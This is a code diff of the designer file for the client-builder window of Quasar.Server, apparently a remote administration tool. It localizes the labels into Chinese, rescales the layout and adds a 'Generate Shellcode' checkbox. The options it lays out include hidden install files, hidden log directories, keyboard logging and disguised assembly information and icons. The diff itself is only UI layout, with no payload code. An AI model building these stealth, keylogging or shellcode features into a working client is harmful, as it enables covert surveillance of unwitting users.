+            this.rbAppdata.Location = new System.Drawing.Point(482, 90);
+            this.rbAppdata.Margin = new System.Windows.Forms.Padding(6);
             this.rbAppdata.Name = "rbAppdata";
-            this.rbAppdata.Size = new System.Drawing.Size(137, 17);
+            this.rbAppdata.Size = new System.Drawing.Size(252, 34);
             this.rbAppdata.TabIndex = 3;
             this.rbAppdata.TabStop = true;
             this.rbAppdata.Text = "User Application Data";
@@ -726,56 +777,62 @@ namespace Quasar.Server.Forms
             // chkHide
             // 
             this.chkHide.AutoSize = true;
-            this.chkHide.Location = new System.Drawing.Point(20, 185);
+            this.chkHide.Location = new System.Drawing.Point(40, 370);
+            this.chkHide.Margin = new System.Windows.Forms.Padding(6);
             this.chkHide.Name = "chkHide";
-            this.chkHide.Size = new System.Drawing.Size(168, 17);
+            this.chkHide.Size = new System.Drawing.Size(275, 34);
             this.chkHide.TabIndex = 11;
-            this.chkHide.Text = "Set file attributes to hidden";
+            this.chkHide.Text = "将文件属性设置为隐藏";
             this.chkHide.UseVisualStyleBackColor = true;
             this.chkHide.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // lblInstallDirectory
             // 
             this.lblInstallDirectory.AutoSize = true;
-            this.lblInstallDirectory.Location = new System.Drawing.Point(17, 47);
+            this.lblInstallDirectory.Location = new System.Drawing.Point(34, 94);
+            this.lblInstallDirectory.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblInstallDirectory.Name = "lblInstallDirectory";
-            this.lblInstallDirectory.Size = new System.Drawing.Size(90, 13);
+            this.lblInstallDirectory.Size = new System.Drawing.Size(128, 30);
             this.lblInstallDirectory.TabIndex = 2;
-            this.lblInstallDirectory.Text = "Install Directory:";
+            this.lblInstallDirectory.Text = "安装目录：";
             // 
             // lblInstallSubDirectory
             // 
             this.lblInstallSubDirectory.AutoSize = true;
-            this.lblInstallSubDirectory.Location = new System.Drawing.Point(17, 126);
+            this.lblInstallSubDirectory.Location = new System.Drawing.Point(34, 252);
+            this.lblInstallSubDirectory.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblInstallSubDirectory.Name = "lblInstallSubDirectory";
-            this.lblInstallSubDirectory.Size = new System.Drawing.Size(109, 13);
+            this.lblInstallSubDirectory.Size = new System.Drawing.Size(151, 30);
             this.lblInstallSubDirectory.TabIndex = 6;
-            this.lblInstallSubDirectory.Text = "Install Subdirectory:";
+            this.lblInstallSubDirectory.Text = "安装子目录：";
             // 
             // lblPreviewPath
             // 
             this.lblPreviewPath.AutoSize = true;
-            this.lblPreviewPath.Location = new System.Drawing.Point(17, 218);
+            this.lblPreviewPath.Location = new System.Drawing.Point(34, 436);
+            this.lblPreviewPath.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblPreviewPath.Name = "lblPreviewPath";
-            this.lblPreviewPath.Size = new System.Drawing.Size(157, 13);
+            this.lblPreviewPath.Size = new System.Drawing.Size(174, 30);
             this.lblPreviewPath.TabIndex = 12;
-            this.lblPreviewPath.Text = "Installation Location Preview:";
+            this.lblPreviewPath.Text = "安装位置预览：";
             // 
             // txtInstallSubDirectory
             // 
-            this.txtInstallSubDirectory.Location = new System.Drawing.Point(182, 123);
+            this.txtInstallSubDirectory.Location = new System.Drawing.Point(364, 246);
+            this.txtInstallSubDirectory.Margin = new System.Windows.Forms.Padding(6);
             this.txtInstallSubDirectory.Name = "txtInstallSubDirectory";
-            this.txtInstallSubDirectory.Size = new System.Drawing.Size(201, 22);
+            this.txtInstallSubDirectory.Size = new System.Drawing.Size(398, 37);
             this.txtInstallSubDirectory.TabIndex = 7;
             this.txtInstallSubDirectory.TextChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
             this.txtInstallSubDirectory.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtInstallsub_KeyPress);
             // 
             // txtPreviewPath
             // 
-            this.txtPreviewPath.Location = new System.Drawing.Point(20, 234);
+            this.txtPreviewPath.Location = new System.Drawing.Point(40, 468);
+            this.txtPreviewPath.Margin = new System.Windows.Forms.Padding(6);
             this.txtPreviewPath.Name = "txtPreviewPath";
             this.txtPreviewPath.ReadOnly = true;
-            this.txtPreviewPath.Size = new System.Drawing.Size(363, 22);
+            this.txtPreviewPath.Size = new System.Drawing.Size(722, 37);
             this.txtPreviewPath.TabIndex = 13;
             this.txtPreviewPath.TabStop = false;
             // 
@@ -808,228 +865,254 @@ namespace Quasar.Server.Forms
             this.assemblyPage.Controls.Add(this.lblTrademarks);
             this.assemblyPage.Controls.Add(this.txtCopyright);
             this.assemblyPage.Location = new System.Drawing.Point(140, 4);
+            this.assemblyPage.Margin = new System.Windows.Forms.Padding(6);
             this.assemblyPage.Name = "assemblyPage";
-            this.assemblyPage.Size = new System.Drawing.Size(391, 376);
+            this.assemblyPage.Size = new System.Drawing.Size(926, 760);
             this.assemblyPage.TabIndex = 2;
-            this.assemblyPage.Text = "Assembly Settings";
+            this.assemblyPage.Text = "程序集设置";
             // 
             // iconPreview
             // 
-            this.iconPreview.Location = new System.Drawing.Point(319, 302);
+            this.iconPreview.Location = new System.Drawing.Point(638, 604);
+            this.iconPreview.Margin = new System.Windows.Forms.Padding(6);
             this.iconPreview.Name = "iconPreview";
-            this.iconPreview.Size = new System.Drawing.Size(64, 64);
+            this.iconPreview.Size = new System.Drawing.Size(128, 128);
             this.iconPreview.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
             this.iconPreview.TabIndex = 42;
             this.iconPreview.TabStop = false;
             // 
             // btnBrowseIcon
             // 
-            this.btnBrowseIcon.Location = new System.Drawing.Point(177, 343);
+            this.btnBrowseIcon.Location = new System.Drawing.Point(354, 686);
+            this.btnBrowseIcon.Margin = new System.Windows.Forms.Padding(6);
             this.btnBrowseIcon.Name = "btnBrowseIcon";
-            this.btnBrowseIcon.Size = new System.Drawing.Size(125, 23);
+            this.btnBrowseIcon.Size = new System.Drawing.Size(250, 46);
             this.btnBrowseIcon.TabIndex = 41;
-            this.btnBrowseIcon.Text = "Browse...";
+            this.btnBrowseIcon.Text = "浏览...";
             this.btnBrowseIcon.UseVisualStyleBackColor = true;
             this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
             // 
             // txtIconPath
             // 
-            this.txtIconPath.Location = new System.Drawing.Point(20, 315);
+            this.txtIconPath.Location = new System.Drawing.Point(40, 630);
+            this.txtIconPath.Margin = new System.Windows.Forms.Padding(6);
             this.txtIconPath.Name = "txtIconPath";
-            this.txtIconPath.Size = new System.Drawing.Size(282, 22);
+            this.txtIconPath.Size = new System.Drawing.Size(560, 37);
             this.txtIconPath.TabIndex = 39;
             // 
             // line8
             // 
             this.line8.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line8.Location = new System.Drawing.Point(122, 5);
+            this.line8.Location = new System.Drawing.Point(244, 10);
+            this.line8.Margin = new System.Windows.Forms.Padding(6);
             this.line8.Name = "line8";
-            this.line8.Size = new System.Drawing.Size(261, 13);
+            this.line8.Size = new System.Drawing.Size(522, 26);
             this.line8.TabIndex = 36;
             this.line8.TabStop = false;
             // 
             // label11
             // 
             this.label11.AutoSize = true;
-            this.label11.Location = new System.Drawing.Point(6, 5);
+            this.label11.Location = new System.Drawing.Point(12, 10);
+            this.label11.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label11.Name = "label11";
-            this.label11.Size = new System.Drawing.Size(118, 13);
+            this.label11.Size = new System.Drawing.Size(128, 30);
             this.label11.TabIndex = 35;
-            this.label11.Text = "Assembly Information";
+            this.label11.Text = "程序集信息";
             // 
             // chkChangeAsmInfo
             // 
             this.chkChangeAsmInfo.AutoSize = true;
-            this.chkChangeAsmInfo.Location = new System.Drawing.Point(20, 21);
+            this.chkChangeAsmInfo.Location = new System.Drawing.Point(40, 42);
+            this.chkChangeAsmInfo.Margin = new System.Windows.Forms.Padding(6);
             this.chkChangeAsmInfo.Name = "chkChangeAsmInfo";
-            this.chkChangeAsmInfo.Size = new System.Drawing.Size(180, 17);
+            this.chkChangeAsmInfo.Size = new System.Drawing.Size(206, 34);
             this.chkChangeAsmInfo.TabIndex = 0;
-            this.chkChangeAsmInfo.Text = "Change Assembly Information";
+            this.chkChangeAsmInfo.Text = "更改程序集信息";
             this.chkChangeAsmInfo.UseVisualStyleBackColor = true;
             this.chkChangeAsmInfo.CheckedChanged += new System.EventHandler(this.chkChangeAsmInfo_CheckedChanged);
             // 
             // txtFileVersion
             // 
-            this.txtFileVersion.Location = new System.Drawing.Point(182, 240);
+            this.txtFileVersion.Location = new System.Drawing.Point(364, 480);
+            this.txtFileVersion.Margin = new System.Windows.Forms.Padding(6);
             this.txtFileVersion.Name = "txtFileVersion";
-            this.txtFileVersion.Size = new System.Drawing.Size(201, 22);
+            this.txtFileVersion.Size = new System.Drawing.Size(398, 37);
             this.txtFileVersion.TabIndex = 16;
             this.txtFileVersion.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // line9
             // 
             this.line9.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line9.Location = new System.Drawing.Point(83, 276);
+            this.line9.Location = new System.Drawing.Point(166, 552);
+            this.line9.Margin = new System.Windows.Forms.Padding(6);
             this.line9.Name = "line9";
-            this.line9.Size = new System.Drawing.Size(300, 13);
+            this.line9.Size = new System.Drawing.Size(600, 26);
             this.line9.TabIndex = 38;
             this.line9.TabStop = false;
             // 
             // lblProductName
             // 
             this.lblProductName.AutoSize = true;
-            this.lblProductName.Location = new System.Drawing.Point(17, 47);
+            this.lblProductName.Location = new System.Drawing.Point(34, 94);
+            this.lblProductName.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblProductName.Name = "lblProductName";
-            this.lblProductName.Size = new System.Drawing.Size(82, 13);
+            this.lblProductName.Size = new System.Drawing.Size(128, 30);
             this.lblProductName.TabIndex = 1;
-            this.lblProductName.Text = "Product Name:";
+            this.lblProductName.Text = "产品名称：";
             // 
             // label12
             // 
             this.label12.AutoSize = true;
-            this.label12.Location = new System.Drawing.Point(6, 276);
+            this.label12.Location = new System.Drawing.Point(12, 552);
+            this.label12.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label12.Name = "label12";
-            this.label12.Size = new System.Drawing.Size(79, 13);
+            this.label12.Size = new System.Drawing.Size(128, 30);
             this.label12.TabIndex = 0;
-            this.label12.Text = "Assembly Icon";
+            this.label12.Text = "程序集图标";
             // 
             // chkChangeIcon
             // 
             this.chkChangeIcon.AutoSize = true;
-            this.chkChangeIcon.Location = new System.Drawing.Point(20, 294);
+            this.chkChangeIcon.Location = new System.Drawing.Point(40, 588);
+            this.chkChangeIcon.Margin = new System.Windows.Forms.Padding(6);
             this.chkChangeIcon.Name = "chkChangeIcon";
-            this.chkChangeIcon.Size = new System.Drawing.Size(141, 17);
+            this.chkChangeIcon.Size = new System.Drawing.Size(206, 34);
             this.chkChangeIcon.TabIndex = 2;
-            this.chkChangeIcon.Text = "Change Assembly Icon";
+            this.chkChangeIcon.Text = "更改程序集图标";
             this.chkChangeIcon.UseVisualStyleBackColor = true;
             this.chkChangeIcon.CheckedChanged += new System.EventHandler(this.chkChangeIcon_CheckedChanged);
             // 
             // lblFileVersion
             // 
             this.lblFileVersion.AutoSize = true;
-            this.lblFileVersion.Location = new System.Drawing.Point(17, 243);
+            this.lblFileVersion.Location = new System.Drawing.Point(34, 486);
+            this.lblFileVersion.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblFileVersion.Name = "lblFileVersion";
-            this.lblFileVersion.Size = new System.Drawing.Size(69, 13);
+            this.lblFileVersion.Size = new System.Drawing.Size(128, 30);
             this.lblFileVersion.TabIndex = 15;
-            this.lblFileVersion.Text = "File Version:";
+            this.lblFileVersion.Text = "文件版本：";
             // 
             // txtProductName
             // 
-            this.txtProductName.Location = new System.Drawing.Point(182, 44);
+            this.txtProductName.Location = new System.Drawing.Point(364, 88);
+            this.txtProductName.Margin = new System.Windows.Forms.Padding(6);
             this.txtProductName.Name = "txtProductName";
-            this.txtProductName.Size = new System.Drawing.Size(201, 22);
+            this.txtProductName.Size = new System.Drawing.Size(398, 37);
             this.txtProductName.TabIndex = 2;
             this.txtProductName.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // txtProductVersion
             // 
-            this.txtProductVersion.Location = new System.Drawing.Point(182, 212);
+            this.txtProductVersion.Location = new System.Drawing.Point(364, 424);
+            this.txtProductVersion.Margin = new System.Windows.Forms.Padding(6);
             this.txtProductVersion.Name = "txtProductVersion";
-            this.txtProductVersion.Size = new System.Drawing.Size(201, 22);
+            this.txtProductVersion.Size = new System.Drawing.Size(398, 37);
             this.txtProductVersion.TabIndex = 14;
             this.txtProductVersion.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // lblDescription
             // 
             this.lblDescription.AutoSize = true;
-            this.lblDescription.Location = new System.Drawing.Point(17, 75);
+            this.lblDescription.Location = new System.Drawing.Point(34, 150);
+            this.lblDescription.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblDescription.Name = "lblDescription";
-            this.lblDescription.Size = new System.Drawing.Size(69, 13);
+            this.lblDescription.Size = new System.Drawing.Size(82, 30);
             this.lblDescription.TabIndex = 3;
-            this.lblDescription.Text = "Description:";
+            this.lblDescription.Text = "描述：";
             // 
             // lblProductVersion
             // 
             this.lblProductVersion.AutoSize = true;
-            this.lblProductVersion.Location = new System.Drawing.Point(17, 215);
+            this.lblProductVersion.Location = new System.Drawing.Point(34, 430);
+            this.lblProductVersion.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblProductVersion.Name = "lblProductVersion";
-            this.lblProductVersion.Size = new System.Drawing.Size(91, 13);
+            this.lblProductVersion.Size = new System.Drawing.Size(128, 30);
             this.lblProductVersion.TabIndex = 13;
-            this.lblProductVersion.Text = "Product Version:";
+            this.lblProductVersion.Text = "产品版本：";
             // 
             // txtDescription
             // 
-            this.txtDescription.Location = new System.Drawing.Point(182, 72);
+            this.txtDescription.Location = new System.Drawing.Point(364, 144);
+            this.txtDescription.Margin = new System.Windows.Forms.Padding(6);
             this.txtDescription.Name = "txtDescription";
-            this.txtDescription.Size = new System.Drawing.Size(201, 22);
+            this.txtDescription.Size = new System.Drawing.Size(398, 37);
             this.txtDescription.TabIndex = 4;
             this.txtDescription.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // txtOriginalFilename
             // 
-            this.txtOriginalFilename.Location = new System.Drawing.Point(182, 184);
+            this.txtOriginalFilename.Location = new System.Drawing.Point(364, 368);
+            this.txtOriginalFilename.Margin = new System.Windows.Forms.Padding(6);
             this.txtOriginalFilename.Name = "txtOriginalFilename";
-            this.txtOriginalFilename.Size = new System.Drawing.Size(201, 22);
+            this.txtOriginalFilename.Size = new System.Drawing.Size(398, 37);
             this.txtOriginalFilename.TabIndex = 12;
             this.txtOriginalFilename.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // lblCompanyName
             // 
             this.lblCompanyName.AutoSize = true;
-            this.lblCompanyName.Location = new System.Drawing.Point(17, 103);
+            this.lblCompanyName.Location = new System.Drawing.Point(34, 206);
+            this.lblCompanyName.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblCompanyName.Name = "lblCompanyName";
-            this.lblCompanyName.Size = new System.Drawing.Size(90, 13);
+            this.lblCompanyName.Size = new System.Drawing.Size(128, 30);
             this.lblCompanyName.TabIndex = 5;
-            this.lblCompanyName.Text = "Company Name:";
+            this.lblCompanyName.Text = "公司名称：";
             // 
             // lblOriginalFilename
             // 
             this.lblOriginalFilename.AutoSize = true;
-            this.lblOriginalFilename.Location = new System.Drawing.Point(17, 187);
+            this.lblOriginalFilename.Location = new System.Drawing.Point(34, 374);
+            this.lblOriginalFilename.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblOriginalFilename.Name = "lblOriginalFilename";
-            this.lblOriginalFilename.Size = new System.Drawing.Size(101, 13);
+            this.lblOriginalFilename.Size = new System.Drawing.Size(151, 30);
             this.lblOriginalFilename.TabIndex = 11;
-            this.lblOriginalFilename.Text = "Original Filename:";
+            this.lblOriginalFilename.Text = "原始文件名：";
             // 
             // txtCompanyName
             // 
-            this.txtCompanyName.Location = new System.Drawing.Point(182, 100);
+            this.txtCompanyName.Location = new System.Drawing.Point(364, 200);
+            this.txtCompanyName.Margin = new System.Windows.Forms.Padding(6);
             this.txtCompanyName.Name = "txtCompanyName";
-            this.txtCompanyName.Size = new System.Drawing.Size(201, 22);
+            this.txtCompanyName.Size = new System.Drawing.Size(398, 37);
             this.txtCompanyName.TabIndex = 6;
             this.txtCompanyName.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // txtTrademarks
             // 
-            this.txtTrademarks.Location = new System.Drawing.Point(182, 156);
+            this.txtTrademarks.Location = new System.Drawing.Point(364, 312);
+            this.txtTrademarks.Margin = new System.Windows.Forms.Padding(6);
             this.txtTrademarks.Name = "txtTrademarks";
-            this.txtTrademarks.Size = new System.Drawing.Size(201, 22);
+            this.txtTrademarks.Size = new System.Drawing.Size(398, 37);
             this.txtTrademarks.TabIndex = 10;
             this.txtTrademarks.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // lblCopyright
             // 
             this.lblCopyright.AutoSize = true;
-            this.lblCopyright.Location = new System.Drawing.Point(17, 131);
+            this.lblCopyright.Location = new System.Drawing.Point(34, 262);
+            this.lblCopyright.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblCopyright.Name = "lblCopyright";
-            this.lblCopyright.Size = new System.Drawing.Size(61, 13);
+            this.lblCopyright.Size = new System.Drawing.Size(128, 30);
             this.lblCopyright.TabIndex = 7;
-            this.lblCopyright.Text = "Copyright:";
+            this.lblCopyright.Text = "版权所有：";
             // 
             // lblTrademarks
             // 
             this.lblTrademarks.AutoSize = true;
-            this.lblTrademarks.Location = new System.Drawing.Point(17, 159);
+            this.lblTrademarks.Location = new System.Drawing.Point(34, 318);
+            this.lblTrademarks.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblTrademarks.Name = "lblTrademarks";
-            this.lblTrademarks.Size = new System.Drawing.Size(68, 13);
+            this.lblTrademarks.Size = new System.Drawing.Size(82, 30);
             this.lblTrademarks.TabIndex = 9;
-            this.lblTrademarks.Text = "Trademarks:";
+            this.lblTrademarks.Text = "商标：";
             // 
             // txtCopyright
             // 
-            this.txtCopyright.Location = new System.Drawing.Point(182, 128);
+            this.txtCopyright.Location = new System.Drawing.Point(364, 256);
+            this.txtCopyright.Margin = new System.Windows.Forms.Padding(6);
             this.txtCopyright.Name = "txtCopyright";
-            this.txtCopyright.Size = new System.Drawing.Size(201, 22);
+            this.txtCopyright.Size = new System.Drawing.Size(398, 37);
             this.txtCopyright.TabIndex = 8;
             this.txtCopyright.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
@@ -1043,27 +1126,30 @@ namespace Quasar.Server.Forms
             this.monitoringTab.Controls.Add(this.label14);
             this.monitoringTab.Controls.Add(this.chkKeylogger);
             this.monitoringTab.Location = new System.Drawing.Point(140, 4);
+            this.monitoringTab.Margin = new System.Windows.Forms.Padding(6);
             this.monitoringTab.Name = "monitoringTab";
-            this.monitoringTab.Size = new System.Drawing.Size(391, 376);
+            this.monitoringTab.Size = new System.Drawing.Size(926, 760);
             this.monitoringTab.TabIndex = 3;
-            this.monitoringTab.Text = "Monitoring Settings";
+            this.monitoringTab.Text = "监视设置";
             // 
             // chkHideLogDirectory
             // 
             this.chkHideLogDirectory.AutoSize = true;
-            this.chkHideLogDirectory.Location = new System.Drawing.Point(20, 72);
+            this.chkHideLogDirectory.Location = new System.Drawing.Point(40, 144);
+            this.chkHideLogDirectory.Margin = new System.Windows.Forms.Padding(6);
             this.chkHideLogDirectory.Name = "chkHideLogDirectory";
-            this.chkHideLogDirectory.Size = new System.Drawing.Size(197, 17);
+            this.chkHideLogDirectory.Size = new System.Drawing.Size(275, 34);
             this.chkHideLogDirectory.TabIndex = 7;
-            this.chkHideLogDirectory.Text = "Set directory attributes to hidden";
+            this.chkHideLogDirectory.Text = "将目录属性设置为隐藏";
             this.chkHideLogDirectory.UseVisualStyleBackColor = true;
             this.chkHideLogDirectory.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // txtLogDirectoryName
             // 
-            this.txtLogDirectoryName.Location = new System.Drawing.Point(262, 44);
+            this.txtLogDirectoryName.Location = new System.Drawing.Point(524, 88);
+            this.txtLogDirectoryName.Margin = new System.Windows.Forms.Padding(6);
             this.txtLogDirectoryName.Name = "txtLogDirectoryName";
-            this.txtLogDirectoryName.Size = new System.Drawing.Size(118, 22);
+            this.txtLogDirectoryName.Size = new System.Drawing.Size(232, 37);
             this.txtLogDirectoryName.TabIndex = 6;
             this.txtLogDirectoryName.TextChanged += new System.EventHandler(this.HasChangedSetting);
             this.txtLogDirectoryName.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtLogDirectoryName_KeyPress);
@@ -1071,57 +1157,73 @@ namespace Quasar.Server.Forms
             // lblLogDirectory
             // 
             this.lblLogDirectory.AutoSize = true;
-            this.lblLogDirectory.Location = new System.Drawing.Point(17, 47);
+            this.lblLogDirectory.Location = new System.Drawing.Point(34, 94);
+            this.lblLogDirectory.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblLogDirectory.Name = "lblLogDirectory";
-            this.lblLogDirectory.Size = new System.Drawing.Size(110, 13);
+            this.lblLogDirectory.Size = new System.Drawing.Size(174, 30);
             this.lblLogDirectory.TabIndex = 5;
-            this.lblLogDirectory.Text = "Log Directory Name:";
+            this.lblLogDirectory.Text = "日志目录名称：";
             // 
             // line10
             // 
             this.line10.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line10.Location = new System.Drawing.Point(78, 5);
+            this.line10.Location = new System.Drawing.Point(156, 10);
+            this.line10.Margin = new System.Windows.Forms.Padding(6);
             this.line10.Name = "line10";
-            this.line10.Size = new System.Drawing.Size(302, 13);
+            this.line10.Size = new System.Drawing.Size(604, 26);
             this.line10.TabIndex = 41;
             this.line10.TabStop = false;
             // 
             // label14
             // 
             this.label14.AutoSize = true;
-            this.label14.Location = new System.Drawing.Point(6, 5);
+            this.label14.Location = new System.Drawing.Point(12, 10);
+            this.label14.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label14.Name = "label14";
-            this.label14.Size = new System.Drawing.Size(66, 13);
+            this.label14.Size = new System.Drawing.Size(59, 30);
             this.label14.TabIndex = 3;
-            this.label14.Text = "Monitoring";
+            this.label14.Text = "监视";
             // 
             // chkKeylogger
             // 
             this.chkKeylogger.AutoSize = true;
-            this.chkKeylogger.Location = new System.Drawing.Point(20, 21);
+            this.chkKeylogger.Location = new System.Drawing.Point(40, 42);
+            this.chkKeylogger.Margin = new System.Windows.Forms.Padding(6);
             this.chkKeylogger.Name = "chkKeylogger";
-            this.chkKeylogger.Size = new System.Drawing.Size(156, 17);
+            this.chkKeylogger.Size = new System.Drawing.Size(229, 34);
             this.chkKeylogger.TabIndex = 4;
-            this.chkKeylogger.Text = "Enable keyboard logging";
+            this.chkKeylogger.Text = "启用键盘日志记录";
             this.chkKeylogger.UseVisualStyleBackColor = true;
             this.chkKeylogger.CheckedChanged += new System.EventHandler(this.chkKeylogger_CheckedChanged);
             // 
+            // chkGenerateShellcode
+            // 
+            this.chkGenerateShellcode.AutoSize = true;
+            this.chkGenerateShellcode.Location = new System.Drawing.Point(559, 787);
+            this.chkGenerateShellcode.Name = "chkGenerateShellcode";
+            this.chkGenerateShellcode.Size = new System.Drawing.Size(191, 34);
+            this.chkGenerateShellcode.TabIndex = 2;
+            this.chkGenerateShellcode.Text = "生成 Shellcode";
+            this.chkGenerateShellcode.UseVisualStyleBackColor = true;
+            // 
             // FrmBuilder
             // 
-            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
+            this.AutoScaleDimensions = new System.Drawing.SizeF(192F, 192F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
             this.BackColor = System.Drawing.SystemColors.Control;
-            this.ClientSize = new System.Drawing.Size(535, 424);
+            this.ClientSize = new System.Drawing.Size(1070, 848);
+            this.Controls.Add(this.chkGenerateShellcode);
             this.Controls.Add(this.builderTabs);
             this.Controls.Add(this.btnBuild);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Margin = new System.Windows.Forms.Padding(6);
             this.MaximizeBox = false;
             this.MinimizeBox = false;
             this.Name = "FrmBuilder";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "Client Builder";
+            this.Text = "生成客户端";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmBuilder_FormClosing);
             this.Load += new System.EventHandler(this.FrmBuilder_Load);
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).EndInit();
@@ -1142,6 +1244,7 @@ namespace Quasar.Server.Forms
             this.monitoringTab.ResumeLayout(false);
             this.monitoringTab.PerformLayout();
             this.ResumeLayout(false);
+            this.PerformLayout();
 
         }
 
@@ -1239,5 +1342,6 @@ namespace Quasar.Server.Forms
         private Line line2;
         private System.Windows.Forms.Label label2;
         private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.CheckBox chkGenerateShellcode;
     }
 }
